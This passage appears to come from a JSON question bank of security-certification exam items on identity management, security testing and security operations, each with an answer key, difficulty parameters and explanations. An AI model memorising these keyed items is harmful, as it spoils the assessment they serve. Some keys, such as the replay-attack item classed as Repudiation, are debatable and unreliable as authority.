        "The SCIM deprovisioning events from the HR system are not being processed by the cloud apps — either SCIM is not configured for DELETE/deactivate, or the apps have not enabled SCIM provisioning for offboarding",
        "The cloud apps require manual confirmation before executing SCIM-triggered deprovisions for security",
        "SCIM only supports provisioning (creating) accounts, not deprovisioning",
        "The 48-hour delay is expected; SCIM has a 48-hour propagation time by design"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: SCIM supports both provisioning and deprovisioning via DELETE/patch operations. The failure indicates that either the HR system isn't sending deprovisioning events, or the cloud apps aren't configured to act on them. SCIM fully supports deprovisioning — that's a core use case. SCIM is near-real-time; there is no 48-hour design delay. Cloud apps shouldn't require manual confirmation for automated SCIM deprovision — that defeats the automation purpose."
    },
    {
      "id": "d5-q30",
      "domain": "5 Identity and Access Management",
      "stem": "An organization uses directory synchronization to provision user accounts from the on-premises directory service to a cloud identity provider. During a review, the security team finds that service account passwords are synchronized to the cloud. What is the PRIMARY risk?",
      "choices": [
        "Synchronized service accounts will have weaker password requirements in the cloud",
        "Password synchronization is always prohibited under NIST guidelines and creates compliance violations",
        "Service account credentials in the cloud extend the attack surface — a cloud breach could expose credentials that grant broad on-premises access, creating a cloud-to-on-premises lateral movement path",
        "Directory synchronization latency means service account passwords are frequently out of sync"
      ],
      "correctIndex": 2,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Synchronizing service account passwords to the cloud creates a bidirectional risk path. If the cloud environment is compromised, the attacker obtains credentials that work on-premises. This is a key concern in hybrid identity architectures. NIST doesn't universally prohibit password synchronization. Password requirements are configured independently per system. Synchronization latency is an operational concern, not a security risk."
    },
    {
      "id": "d5-q31",
      "domain": "5 Identity and Access Management",
      "stem": "A financial services firm implements step-up authentication for high-value transactions. A user who logs in with username/password is asked for a hardware token when initiating a wire transfer over $10,000. What is the security principle MOST clearly demonstrated?",
      "choices": [
        "Privileged access management — elevated credentials are required for financial operations",
        "Dual control — two separate individuals must authenticate to complete high-value transactions",
        "Risk-based authentication — authentication strength is scaled to the risk level of the specific action, not applied uniformly for all operations",
        "Separation of duties — the user who initiates the transfer cannot also approve it"
      ],
      "correctIndex": 2,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Step-up authentication is risk-based — it applies stronger authentication dynamically based on the risk of the current action (high-value wire transfer) rather than requiring the highest authentication level for all operations. This balances usability with security. Dual control requires two different people, not just stronger authentication. Separation of duties divides responsibilities between roles. PAM addresses privileged system access, not transaction authentication."
    },
    {
      "id": "d5-q32",
      "domain": "5 Identity and Access Management",
      "stem": "Auditors find that a company's access control system grants permissions based on job title alone, without considering actual job functions. A marketing manager has access to financial systems because managers at that title level were historically granted it. Which access control model shift would BEST address this?",
      "choices": [
        "Replace all role-based access with mandatory access control based on security clearances",
        "Require annual user attestation of their own access as the primary governance control",
        "Move from a coarse-grained title-based model toward fine-grained role-based or attribute-based access control where permissions map to specific job functions and business need",
        "Implement a discretionary access control model where each resource owner decides who has access"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: The problem is that titles are too broad — permissions should map to specific functions (principle of least privilege). Fine-grained RBAC or ABAC based on actual job functions eliminates the over-permission pattern. MAC is for classified environments and not appropriate for enterprise function-based access. DAC gives resource owners control but doesn't enforce least privilege systematically. Annual attestation is a governance detection control, not an access model fix."
    },
    {
      "id": "d6-q16",
      "domain": "6 Security Assessment and Testing",
      "stem": "A compliance analyst is evaluating the CVSS v3.1 base score for a newly discovered vulnerability. The flaw allows a remote, unauthenticated attacker to execute arbitrary code with no user interaction. The scope is changed — the attack impacts a second system beyond the vulnerable component. What CVSS base score range should the analyst expect?",
      "choices": [
        "High (7.0-8.9) — scope change always limits severity because it implies the primary system isn't fully compromised",
        "Critical (9.0-10.0) — remote, unauthenticated, no user interaction, and scope change are all high-severity CVSS metrics that maximize the base score",
        "Low (0.1-3.9) — the impact is limited because the vulnerability affects only code execution, not data confidentiality",
        "Medium (4.0-6.9) — network-accessible vulnerabilities without authentication are common and default to medium"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: CVSS v3.1 Critical (9.0-10.0) scores arise from: Attack Vector=Network, Attack Complexity=Low, Privileges Required=None, User Interaction=None, Scope=Changed, and high CIA impact. This scenario matches all high-severity metrics. Network attack vector increases severity, not decreases it. Scope change increases the score — it means a compromise affects systems beyond the vulnerable one. Code execution typically impacts all three CIA components."
    },
    {
      "id": "d6-q17",
      "domain": "6 Security Assessment and Testing",
      "stem": "A penetration tester is hired to assess a web application. During reconnaissance, the tester discovers employee names and email formats on LinkedIn. During scanning, the tester identifies the application runs a known vulnerable version of a CMS. What is the NEXT step in the penetration testing methodology?",
      "choices": [
        "Reporting — document the CMS version as a finding and submit it without exploitation",
        "Social engineering — use the LinkedIn data to craft phishing emails to employees",
        "Post-exploitation — establish persistence before confirming exploitation",
        "Exploitation — attempt to exploit the identified CMS vulnerability using a proof-of-concept to confirm exploitability within the defined scope"
      ],
      "correctIndex": 3,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Standard pentest phases are: Recon → Scanning/Enumeration → Exploitation → Post-exploitation → Reporting. After identifying the vulnerable CMS version through scanning, the next step is exploitation — attempting to confirm whether the vulnerability is actually exploitable in this context. Reporting before exploitation provides incomplete findings. Post-exploitation occurs after successful exploitation. Social engineering is a separate test track not described in scope and requires explicit authorization."
    },
    {
      "id": "d6-q18",
      "domain": "6 Security Assessment and Testing",
      "stem": "A company's SOC team starts a purple team exercise. The red team simulates an APT, and the blue team defends using their current detection tools. After each red team action, both teams discuss what was detected, what was missed, and why. What distinguishes this from a standard red team engagement?",
      "choices": [
        "Purple team exercises are less realistic because the red team reveals their techniques",
        "Purple team exercises are solely for training junior analysts and have no value for mature SOC teams",
        "Purple team exercises test only the blue team — the red team acts as an automated attack simulator",
        "Purple team exercises involve real-time collaboration and knowledge transfer between red and blue teams, improving detection capabilities iteratively during the exercise rather than just assessing them"
      ],
      "correctIndex": 3,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Purple team exercises are collaborative — they combine red team attack execution with real-time blue team detection analysis and feedback. The goal is detection improvement, not just assessment of current state. Standard red teams operate independently, submit a report, and defenders learn only post-exercise. The real-time knowledge transfer is the distinguishing feature. Revealing techniques is intentional — it accelerates blue team development. Both teams benefit; this is especially valuable for mature SOCs refining specific detection gaps."
    },
    {
      "id": "d6-q19",
      "domain": "6 Security Assessment and Testing",
      "stem": "A SAST tool identifies 800 findings in a codebase. The security team has capacity to remediate 50 per sprint. Which approach to prioritization is MOST aligned with risk management principles?",
      "choices": [
        "Prioritize by CVSS/CWE severity combined with exploitability in the application's context — fix high-severity, reachable, and exploitable findings first regardless of discovery order",
        "Fix all findings in FIFO order — consistent workflow prevents the team from making subjective decisions",
        "Ignore SAST findings until a penetration test confirms they are exploitable",
        "Close all informational findings first to reduce the finding count and improve metrics"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Risk-based prioritization focuses remediation resources on findings that combine high severity with actual exploitability in context. SAST produces many false positives and low-severity issues — blindly fixing by FIFO wastes capacity on low-risk issues while high-severity exploitable flaws wait. Waiting for pentest confirmation before acting on known high-severity SAST findings is irresponsible. Clearing informational findings first optimizes metrics but not security posture."
    },
    {
      "id": "d6-q20",
      "domain": "6 Security Assessment and Testing",
      "stem": "A QA engineer runs a fuzzing campaign against an API and discovers that sending unexpectedly long strings in a JSON field causes the API process to crash. What type of vulnerability does this MOST likely indicate, and what is the NEXT step?",
      "choices": [
        "Memory safety vulnerability (buffer overflow or out-of-bounds write) — file a detailed bug report with the crashing input, enable crash analysis (ASAN/core dumps), and prioritize patching",
        "XML external entity injection — disable external entity processing in the XML parser",
        "Cross-site scripting — encode all output at the API response layer",
        "SQL injection — parameterize all database queries immediately"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Crashes caused by unexpectedly long inputs in native code or unsafe memory operations indicate memory safety bugs — potential buffer overflows. The next step is crash analysis to determine exploitability (ASAN output, core dump analysis). SQL injection and XSS don't cause process crashes from long strings in API fields. XXE involves XML parsers, not JSON APIs with crash-on-length inputs."
    },
    {
      "id": "d6-q21",
      "domain": "6 Security Assessment and Testing",
      "stem": "An organization is choosing between a vulnerability assessment and a penetration test. Management asks what distinct value a penetration test provides over a vulnerability scan. What is the MOST accurate distinction?",
      "choices": [
        "A penetration test is automated; a vulnerability assessment requires manual effort",
        "A vulnerability assessment covers more systems; a penetration test is limited to web applications",
        "A penetration test is a legal requirement; a vulnerability assessment is optional",
        "A penetration test confirms exploitability by attempting to chain vulnerabilities to achieve a real-world impact (data access, privilege escalation), while a vulnerability assessment identifies and classifies potential weaknesses without exploitation"
      ],
      "correctIndex": 3,
      "difficulty": -0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: The key distinction is exploitation. Vulnerability assessments identify and rate potential weaknesses using scanners and manual review. Penetration tests go further — testers actively attempt to exploit findings, chain vulnerabilities, and demonstrate real business impact. Penetration tests are largely manual, not automated. Both can cover broad or narrow scope. Penetration tests are often contractually or regulatory driven, but 'legal requirement' is an overstatement; vulnerability assessments are often more consistently required."
    },
    {
      "id": "d6-q22",
      "domain": "6 Security Assessment and Testing",
      "stem": "During a SOC 2 Type II audit preparation, a compliance officer asks the difference between a SOC 2 Type I and Type II report. An auditor is preparing the organization. Which explanation is MOST accurate?",
      "choices": [
        "Type I reports on the design of controls at a point in time; Type II reports on the operating effectiveness of controls over a defined period (typically 6-12 months)",
        "Type I covers all five Trust Services Criteria; Type II covers only security",
        "Type I is sufficient for all customer security due diligence; Type II is only required for government contracts",
        "Type II is a self-assessment; Type I requires an independent CPA firm"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Correct Answer: SOC 2 Type I assesses the design (existence and suitability) of controls at a single point in time — a snapshot. SOC 2 Type II tests operating effectiveness over a period, providing evidence that controls functioned consistently. Both can cover any combination of Trust Services Criteria (Security, Availability, Processing Integrity, Confidentiality, Privacy). Both require an independent CPA/auditor. Customers typically prefer Type II because it shows controls actually work over time."
    },
    {
      "id": "d6-q23",
      "domain": "6 Security Assessment and Testing",
      "stem": "A threat modeling session applies STRIDE to an API endpoint that handles financial transactions. The team identifies that an attacker could replay a legitimate transaction to transfer funds twice. Which STRIDE category does this threat fall under?",
      "choices": [
        "Repudiation — the attacker uses a valid, previously authenticated transaction to make duplicate transfers that can be difficult to attribute as malicious",
        "Information Disclosure — the attacker obtains sensitive transaction data during replay",
        "Spoofing — the attacker pretends to be a legitimate user by using a captured transaction",
        "Tampering — the attacker modifies the transaction amount before replaying"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Replay attacks are a Repudiation threat in STRIDE — the attacker uses valid credentials/transactions in a way that can be denied or misattributed. However, replay attacks can also be classified as Spoofing when the attacker is impersonating. In the pure STRIDE model, transaction replay without modification to cause unauthorized actions aligns most closely with Repudiation (the attacker can deny intent by claiming the transaction was a system error). Countermeasures: nonces, timestamps, idempotency keys."
    },
    {
      "id": "d6-q24",
      "domain": "6 Security Assessment and Testing",
      "stem": "An organization's bug bounty program receives a submission showing that a researcher bypassed authentication on an admin panel using a basic SQL injection. The finding is valid. The program policy offers $5,000 for critical findings. The researcher asks for $15,000, citing business impact. What should the program manager do FIRST?",
      "choices": [
        "Pay the $15,000 immediately to maintain researcher goodwill and avoid disclosure",
        "Escalate to legal to evaluate whether the researcher's communication constitutes extortion",
        "Reject the claim because the researcher violated the program rules by demanding more than the stated amount",
        "Acknowledge the finding, confirm its validity and severity per the program's published CVSS-based payout structure, and respond with the rationale for the award amount before negotiating"
      ],
      "correctIndex": 3,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Professional bug bounty management starts with validating the finding and applying the program's stated criteria transparently. Acknowledge, validate, and explain the payout rationale — then allow researcher dialogue. Paying immediately beyond the published rate creates inconsistent precedent. Rejecting the claim entirely is too harsh — severity negotiation is normal. Escalating to legal for a payout discussion is disproportionate and would damage the program's reputation in the researcher community."
    },
    {
      "id": "d6-q25",
      "domain": "6 Security Assessment and Testing",
      "stem": "An organization undergoes its first external security assessment. The assessor recommends implementing DAST as a complement to existing SAST. The development team asks why both are needed. What is the MOST accurate explanation?",
      "choices": [
        "SAST is automated; DAST requires manual execution by security professionals",
        "DAST replaces SAST once the application is deployed; running both is redundant",
        "SAST analyzes source code without running the application (finds code-level flaws like injection patterns); DAST tests the running application from the outside (finds runtime flaws like authentication weaknesses and server misconfigurations that don't appear in static code)",
        "SAST finds all vulnerabilities in compiled code; DAST only tests web interfaces"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Correct Answer: SAST and DAST are complementary, not redundant. SAST scans source or compiled code without execution — catches injection patterns, insecure API usage, hardcoded credentials. DAST sends inputs to a running application — finds runtime issues like authentication bypasses, session management flaws, server configuration errors, and issues that only appear in execution context. Both can be automated. Using both provides broader coverage. SAST doesn't find runtime configuration issues; DAST doesn't access the source code."
    },
    {
      "id": "d6-q26",
      "domain": "6 Security Assessment and Testing",
      "stem": "An IDS tuning review shows the system generates 2,000 alerts per day, but investigation reveals 90% are false positives. The SOC team spends most of its time chasing false alarms. What metric MOST directly measures this problem, and what is the BEST initial remediation?",
      "choices": [
        "MTTR (Mean Time to Remediate) — the fix is to hire more analysts to process alerts faster",
        "The signal-to-noise ratio — tune signature thresholds and whitelist known-good traffic patterns to reduce false positives while retaining detection coverage for real threats",
        "MTTD (Mean Time to Detect) — increase IDS rule sensitivity to catch more threats",
        "False negative rate — lower the detection threshold so the IDS generates more alerts to avoid missing attacks"
      ],
      "correctIndex": 1,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: The issue is excessive false positives drowning out true positives — measured by the false positive rate / signal-to-noise ratio. The fix is tuning: adjust thresholds, baseline normal traffic, whitelist known-good behavior. Hiring more analysts manages the symptom but doesn't fix the root cause. Increasing detection sensitivity would generate even more alerts. Lowering the detection threshold increases false positives further — the opposite of what's needed."
    },
    {
      "id": "d6-q27",
      "domain": "6 Security Assessment and Testing",
      "stem": "During a physical security assessment, a tester enters a secure building by following an employee through a badge-controlled door without badging in. What attack technique is demonstrated, and what control MOST directly mitigates it?",
      "choices": [
        "Shoulder surfing — mitigated by screen privacy filters on badge reader keypads",
        "Badge cloning — mitigated by upgrading to RFID-resistant badge holders",
        "Tailgating/piggybacking — mitigated by security vestibules (mantrap) with one-person-per-badge enforcement",
        "Social engineering — mitigated by security awareness training on challenge policies"
      ],
      "correctIndex": 2,
      "difficulty": -0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Tailgating (piggybacking) is physically following an authorized person through a controlled entry without presenting credentials. A mantrap/security vestibule — an airlock-style entry that allows only one person per badge scan — mechanically prevents tailgating by design. Security awareness training is a complementary control (employees should challenge tailgaters) but is human-dependent. Badge cloning is a different attack (counterfeiting credentials). Shoulder surfing targets credential observation, not physical entry."
    },
    {
      "id": "d6-q28",
      "domain": "6 Security Assessment and Testing",
      "stem": "An application security team integrates IAST (Interactive Application Security Testing) into their CI/CD pipeline. A developer asks how IAST differs from SAST and DAST. Which description is MOST accurate?",
      "choices": [
        "IAST instruments the running application with sensors that monitor internal execution during testing — it combines runtime visibility of DAST with code-level accuracy of SAST, producing contextual findings without access to source code",
        "IAST is identical to DAST but runs inside the CI/CD pipeline",
        "IAST replaces both SAST and DAST and eliminates the need for separate security testing tools",
        "IAST is a hybrid of SAST and DAST that requires full source code access and manual execution"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: IAST uses agents/sensors instrumented inside the running application. During testing (functional or security tests), the sensor observes data flows, taint tracking, and execution paths internally — providing more precise findings than black-box DAST while not requiring source code access like SAST. It's not identical to DAST (DAST is purely external). IAST doesn't require source code. IAST is complementary, not a replacement for SAST/DAST — each covers different scenarios."
    },
    {
      "id": "d6-q29",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security team is reviewing audit logs for a sensitive database. They discover that a DBA ran a bulk data extract at 2 AM on a Saturday and emailed a compressed file to a personal address. The DBA claims it was for disaster recovery testing. What is the MOST appropriate immediate action?",
      "choices": [
        "Treat it as a potential insider threat/data breach — suspend the DBA's access, preserve logs as evidence, and initiate the incident response process while the claim is investigated",
        "Accept the explanation and remind the DBA of proper data handling procedures",
        "Delete the extracted file from the personal email and consider the matter resolved",
        "Require the DBA to re-sign the acceptable use policy before reinstating access"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: This event has all the indicators of a potential insider threat/data exfiltration — off-hours bulk extract, personal email destination. Treat it as an incident: preserve evidence, suspend access pending investigation, follow IR process. Accepting the explanation without investigation is negligent. Deleting the file destroys potential evidence and doesn't address possible prior copies. Re-signing the AUP doesn't constitute an adequate investigation."
    },
    {
      "id": "d6-q30",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security team is scoping a penetration test for a large organization. Management wants to maximize coverage but has concerns about production impact. The team debates white-box vs. black-box testing. Which testing type BEST balances thoroughness with reduced operational risk for this scenario?",
      "choices": [
        "White-box testing — full source code and architecture access guarantees the highest vulnerability coverage with no production testing needed",
        "Black-box testing — it simulates a real attacker with no knowledge, providing the most realistic result",
        "Black-box testing with a full-environment clone — it maximizes realism and completely eliminates production risk",
        "Gray-box testing — testers have partial knowledge (network diagrams, credential examples, documentation) allowing deep coverage while reducing time spent on discovery, which minimizes the duration of active testing in production"
      ],
      "correctIndex": 3,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Gray-box testing combines partial knowledge (reducing discovery time) with active exploitation testing. Less time active in production reduces operational impact while maintaining depth. Black-box is most realistic but spends significant time on reconnaissance that may have limited security value for mature organizations. White-box provides thorough coverage but all manual code review testing doesn't cover runtime behavior. A full-environment clone is ideal but expensive; the question asks about the testing type, not infrastructure."
    },
    {
      "id": "d7-q17",
      "domain": "7 Security Operations",
      "stem": "A SOC analyst receives an alert at 3 AM for an internal host beaconing to a known C2 IP. The analyst confirms the traffic is malicious. According to NIST SP 800-61 incident response phases, what is the CORRECT sequence of next steps?",
      "choices": [
        "Recovery → Containment → Eradication → Post-incident review — restore operations first to minimize business impact",
        "Containment → Eradication → Recovery → Post-incident review — contain first to stop the spread, then remove the threat, restore systems, and learn from the incident",
        "Eradication → Containment → Recovery → Post-incident review — remove the threat immediately before containing to avoid alert fatigue",
        "Post-incident review → Containment → Eradication → Recovery — document first so lessons learned can guide the response"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Correct Answer: NIST SP 800-61 IR phases: Preparation → Detection & Analysis → Containment → Eradication → Recovery → Post-Incident Activity. After detection and confirmation, contain first (stop the spread and isolate the affected system), then eradicate (remove malware, close access), then recover (restore services), then review. Eradicating before containment risks missing other compromised systems. Restoring before eradication reintroduces the threat. Post-incident review happens last."
    },
    {
      "id": "d7-q18",
      "domain": "7 Security Operations",
      "stem": "A forensic analyst is responding to a compromised endpoint workstation. The attacker may still have active processes running. In what ORDER should the analyst collect volatile evidence, according to the order of volatility principle?",
      "choices": [
        "CPU registers and cache → RAM contents → Active network connections → Running processes → Disk image — most volatile (shortest lifespan) data is collected first",
        "Disk image → RAM contents → Network connections → CPU registers — disks retain data longest and should be secured first",
        "Running processes → Disk image → RAM → Network connections → CPU registers — processes provide the most actionable threat intelligence",
        "Network connections → Running processes → RAM → CPU registers → Disk — network forensics is always the priority"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: The order of volatility principle (RFC 3227) captures most ephemeral data first: CPU registers/cache (lost in milliseconds) → RAM (lost on reboot) → network connections (active connections close) → running processes → disk (persists). Disk images last because disk data is the most durable. Collecting disk first while volatile memory still holds attacker artifacts wastes critical evidence. Network connections are important but not the first priority."
    },
    {
      "id": "d7-q19",
      "domain": "7 Security Operations",
      "stem": "During a ransomware incident, the IR team discovers the attacker used valid administrator credentials to deploy the ransomware payload across 300 workstations via a management tool. No malware signatures were present. What detection gap does this MOST illustrate?",
      "choices": [
        "The firewall allowed outbound traffic to the attacker's C2, which should have been blocked",
        "The SOC lacked behavioral detection (UEBA/EDR) capable of identifying anomalous use of legitimate tools — signature-based detection cannot catch living-off-the-land (LotL) attacks using trusted binaries",
        "The SIEM correlation rules weren't configured to alert on mass file encryption events",
        "Anti-virus failed because it wasn't updated with current ransomware signatures"
      ],
      "correctIndex": 1,
      "difficulty": 0.5,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Living-off-the-land attacks use legitimate tools (PsExec, WMI, PowerShell) with valid credentials — signature-based AV/IDS produces no alerts because nothing is 'malicious' by signature. UEBA detects behavioral anomalies (admin account suddenly deploying to 300 systems at 2 AM). EDR provides behavioral telemetry. Firewall blocks are valuable but attackers using internal management tools may not generate external traffic. AV signature update would have no effect on LotL techniques. SIEM encryption alerts are relevant but secondary to the credential-abuse detection gap."
    },
    {
      "id": "d7-q20",
      "domain": "7 Security Operations",
      "stem": "An incident handler preserves evidence from a compromised server by making a forensic image. The hash of the original disk is SHA-256: abc123. The hash of the image is abc123. Three weeks later, the image hash is recalculated: abc123. What does this evidence integrity process demonstrate?",
      "choices": [
        "The original disk has not been modified since imaging, which proves the attacker left no malware",
        "The image is compressed correctly because identical hashes prove deduplication worked",
        "SHA-256 is a symmetric encryption algorithm confirming the evidence is encrypted",
        "Chain of custody and evidence integrity — matching hashes confirm the image is an exact, unaltered copy of the original, establishing admissibility in legal proceedings"
      ],
      "correctIndex": 3,
      "difficulty": -0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Matching hash values across time confirm the forensic image is bit-for-bit identical to the original and has not been modified — this is the basis for evidence integrity and admissibility. Chain of custody documentation accompanies the hash validation process. Hash matching doesn't relate to compression or deduplication. The original disk hash confirms the image quality, not the absence of malware. SHA-256 is a cryptographic hash function, not an encryption algorithm."
    },
    {
      "id": "d7-q21",
      "domain": "7 Security Operations",
      "stem": "A patch management team has a policy to apply critical patches within 30 days. An audit finds that the average time from patch release to deployment is 47 days. What is the PRIMARY risk this gap creates?",
      "choices": [
        "The organization will fail its next compliance audit, creating reputational risk",
        "Vendors stop providing support for unpatched systems after 30 days",
        "Patches may become incompatible if applied too late, increasing deployment failure rates",
        "A 17-day window beyond policy where vulnerabilities remain exploitable after public disclosure — attackers routinely weaponize critical patches within days of release, making the gap a high-probability exposure window"
      ],
      "correctIndex": 3,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: The primary security risk is the exploitation window. Once a critical patch is released, the vulnerability is publicly known. Attackers analyze patches to develop exploits, often within days. A 47-day average means systems are exposed to known exploits for 17 days beyond the policy target. Compliance failure is a secondary consequence. Patch compatibility issues are operational concerns, not the primary security risk. Vendors don't typically drop support at 30 days for unpatched systems."
    },
    {
      "id": "d7-q22",
      "domain": "7 Security Operations",
      "stem": "An organization's change management process requires all changes to go through the Change Advisory Board (CAB) with 5 days notice. During an active incident, an emergency firewall rule is needed immediately. What is the MOST appropriate process?",
      "choices": [
        "Implement the change and never submit it to CAB since it was emergency-driven",
        "Escalate to the CISO to permanently waive the CAB requirement during incidents",
        "Wait for the next CAB meeting in 5 days because bypassing the process creates audit risk",
        "Use the emergency change procedure — implement the critical rule immediately, document the change thoroughly, and submit it for CAB review and ratification within the defined emergency window (typically 24-48 hours post-implementation)"
      ],
      "correctIndex": 3,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Well-designed change management includes an emergency change process that allows immediate implementation for incident response, followed by retrospective review and documentation. This balances security operations agility with governance. Waiting 5 days during an active incident is operationally dangerous. Implementing without any documentation or CAB review creates an unaudited change in the environment. Permanent CISO waivers undermine the purpose of the change control process."
    },
    {
      "id": "d7-q23",
      "domain": "7 Security Operations",
      "stem": "A threat hunting team is analyzing endpoint telemetry looking for indicators of a newly identified APT group. The team has IOCs (IP addresses, hashes) from threat intelligence but the APT is known to rotate infrastructure frequently. What hunting approach is MOST effective against this actor?",
      "choices": [
        "Behavior-based hunting using TTPs (MITRE ATT&CK techniques) rather than IOC-based matching — TTP signatures persist even when infrastructure rotates, because APT groups tend to reuse tooling and attack patterns",
        "Focus exclusively on network traffic analysis because APTs always communicate with external infrastructure",
        "Signature-based hunting using the provided IP addresses and hashes, which are the most accurate indicators",
        "Alert-driven hunting — wait for SIEM alerts before initiating a hunt"
      ],
      "correctIndex": 0,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: IOCs (IPs, hashes) are low-durability indicators — sophisticated APT groups rotate them frequently. TTPs (Techniques, Tactics, Procedures) from MITRE ATT&CK describe how an actor operates — these are much harder to change than C2 IPs. Hunting for behavioral patterns (e.g., specific credential dumping techniques, lateral movement patterns) is more effective against infrastructure-rotating adversaries. Signature-based IOC matching will miss rotated indicators. Alert-driven response is reactive, not proactive hunting. Not all APT activity involves external traffic."
    },
    {
      "id": "d7-q24",
      "domain": "7 Security Operations",
      "stem": "An organization implements a SOAR platform to automate incident response. The SOAR playbook auto-blocks IP addresses that trigger three or more SIEM alerts within 10 minutes. During a production outage, the SOAR blocks a legitimate monitoring server that generated repeated alerts during recovery. What is the MOST important design improvement?",
      "choices": [
        "Increase the threshold from 3 to 50 alerts before blocking to reduce false positives",
        "Replace the SOAR with a manual runbook process to eliminate automation errors",
        "Implement a safelist (allowlist) of critical infrastructure IPs that are excluded from automated blocking, and add a human approval step for blocking production-critical systems",
        "Remove all automated blocking from the SOAR — human analysts must approve every block"
      ],
      "correctIndex": 2,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: SOAR automation should include safelist/allowlist exceptions for critical infrastructure and approval gates for high-risk automated actions. This prevents automation from causing more damage than it prevents. Removing all automation eliminates the SOAR's primary value. Increasing the threshold arbitrarily may still miss real attacks or still catch critical systems. Replacing SOAR with manual runbooks discards efficiency gains."
    },
    {
      "id": "d7-q25",
      "domain": "7 Security Operations",
      "stem": "Following a ransomware incident, an organization's IR team moves to the recovery phase. Backups are available from 3 days before the incident. The team discovers the backups are encrypted by the same ransomware. What fundamental backup control failure does this reveal?",
      "choices": [
        "The backup system was accessible from the network and within the ransomware's lateral movement reach — offline or air-gapped backups would not have been affected by the encryption attack",
        "The backup software wasn't updated with ransomware detection signatures",
        "Backup encryption is always a sign of backup tampering by an insider threat",
        "The organization failed to implement 3-2-1 backup because they only had one set of backups"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Ransomware that encrypts backups reached them via network access — this is the most common ransomware backup failure. The fix is offline, air-gapped, or immutable backups that ransomware cannot reach via network propagation. The 3-2-1 rule (3 copies, 2 media types, 1 offsite) should also include at least one copy that is offline or immutable. Backup software AV isn't the issue — the backup storage was network-reachable. The problem may not involve an insider."
    },
    {
      "id": "d7-q26",
      "domain": "7 Security Operations",
      "stem": "During a tabletop exercise simulating a supply chain attack, the team discovers they have no documented process for assessing whether a third-party software update has been tampered with before deployment. What control addresses this gap MOST directly?",
      "choices": [
        "Delay all third-party updates by 30 days to allow the vendor to identify and patch any supply chain issues",
        "Verify software integrity using vendor-provided cryptographic signatures or checksums before deployment, and establish a policy requiring this verification for all third-party updates",
        "Require vendors to attest in writing that their software has not been tampered with",
        "Restrict all software updates to a dedicated isolated network to contain potential compromise"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Cryptographic signature verification before deployment is the direct technical control for supply chain integrity — it confirms the software came from the legitimate vendor and hasn't been modified. This is what SolarWinds and similar incidents showed was missing. Delaying updates doesn't prevent tampered packages from being deployed — just delays it. Network isolation contains damage but doesn't detect tampering. Written attestations are contractual, not technical controls — they don't detect tampering."
    },
    {
      "id": "d7-q27",
      "domain": "7 Security Operations",
      "stem": "A SIEM correlation rule fires when more than 10 failed login attempts occur from a single IP within 5 minutes. The SOC receives 500 alerts daily from this rule. Investigation shows 95% are from a legitimate automated testing tool during business hours. What is the MOST appropriate tuning action?",
      "choices": [
        "Add the testing tool's IP to an exception list for the specific rule during defined business hours, and verify the exception is reviewed quarterly",
        "Send all 500 alerts to email and require analysts to review each one",
        "Lower the threshold from 10 to 5 failed logins to catch attacks faster",
        "Disable the rule entirely since it generates mostly false positives"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Scoped exceptions for known-good sources (the testing tool's IP) eliminate known false positives without disabling detection for other sources. Quarterly review ensures the exception remains valid. Disabling the rule eliminates brute-force detection entirely. Lowering the threshold increases false positives further. Requiring manual review of 500 daily alerts causes alert fatigue and misses real threats buried in noise."
    },
    {
      "id": "d7-q28",
      "domain": "7 Security Operations",
      "stem": "An organization runs annual DR tests using a 'parallel processing' approach — they spin up the disaster recovery environment while production continues operating. After two successful annual tests, a real disaster occurs and recovery takes 3x longer than the test. What is the MOST likely reason for the discrepancy?",
      "choices": [
        "The parallel approach is inherently flawed — only full production failover tests are valid",
        "The longer recovery time proves the RPO was not met, indicating backup failure",
        "Parallel tests use pre-staged environments and test data; the real event required full environment provisioning from scratch under stress, with real production data volumes and real-world team coordination challenges",
        "The DR team should have conducted monthly tests instead of annual tests"
      ],
      "correctIndex": 2,
      "difficulty": 0.5,
      "discrimination": 1.1,
